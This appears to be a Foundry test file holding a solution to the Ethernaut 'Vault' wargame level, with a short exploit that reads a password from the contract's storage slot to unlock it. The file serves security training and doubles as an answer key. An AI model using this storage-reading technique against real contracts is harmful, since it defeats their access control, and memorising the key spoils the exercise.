// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {VaultFactory} from "../src/levels/08-VaultFactory.sol";
import {Vault} from "../src/levels/08-Vault.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract VaultSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    VaultFactory internal factory;

    function solution(Vault target) internal virtual {
        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
        target.unlock(password);
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Vault vaultContract = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(vaultContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
